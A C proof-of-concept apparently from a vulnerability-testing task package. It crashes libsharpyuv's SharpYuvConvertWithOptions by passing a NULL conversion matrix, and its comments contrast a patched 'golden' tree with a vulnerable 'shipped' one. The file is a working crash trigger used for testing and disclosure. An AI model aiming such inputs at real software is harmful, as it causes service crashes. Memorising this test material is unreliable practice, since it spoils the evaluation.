// PoC for residual NULL-dereference in SharpYuvConvertWithOptions().
//
// Drives the libsharpyuv public API with an otherwise-valid call whose only
// crafted field is options.yuv_matrix == NULL. The documented contract (and the
// upstream fix) rejects such options with a return value of 0. The shipped tree
// fails to reject options->yuv_matrix == NULL and dereferences it while scaling
// the conversion matrix, reading from a NULL pointer.
//
// Golden tree (parent + real upstream fix): returns 0, no fault.
// Shipped tree: AddressSanitizer aborts on the NULL read.

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sharpyuv/sharpyuv.h"

int main(void) {
  const int width = 16;
  const int height = 16;
  const int rgb_step = 3;
  const int rgb_stride = width * 3;
  const int rgb_bit_depth = 8;
  const int yuv_bit_depth = 8;
  const int y_stride = width;
  const int uv_width = (width + 1) / 2;
  const int u_stride = uv_width;
  const int v_stride = uv_width;
  const int uv_height = (height + 1) / 2;

  uint8_t* r = (uint8_t*)calloc((size_t)rgb_stride * height, 1);
  uint8_t* g = (uint8_t*)calloc((size_t)rgb_stride * height, 1);
  uint8_t* b = (uint8_t*)calloc((size_t)rgb_stride * height, 1);
  uint8_t* y = (uint8_t*)calloc((size_t)y_stride * height, 1);
  uint8_t* u = (uint8_t*)calloc((size_t)u_stride * uv_height, 1);
  uint8_t* v = (uint8_t*)calloc((size_t)v_stride * uv_height, 1);

  SharpYuvOptions options;
  memset(&options, 0, sizeof(options));
  // Only crafted field: a NULL conversion matrix. Everything else is valid.
  options.yuv_matrix = NULL;
  options.transfer_type = kSharpYuvTransferFunctionSrgb;

  const int ret = SharpYuvConvertWithOptions(
      r, g, b, rgb_step, rgb_stride, rgb_bit_depth, y, y_stride, u, u_stride, v,
      v_stride, yuv_bit_depth, width, height, &options);

  printf("SharpYuvConvertWithOptions returned %d\n", ret);

  free(r);
  free(g);
  free(b);
  free(y);
  free(u);
  free(v);
  return 0;
}
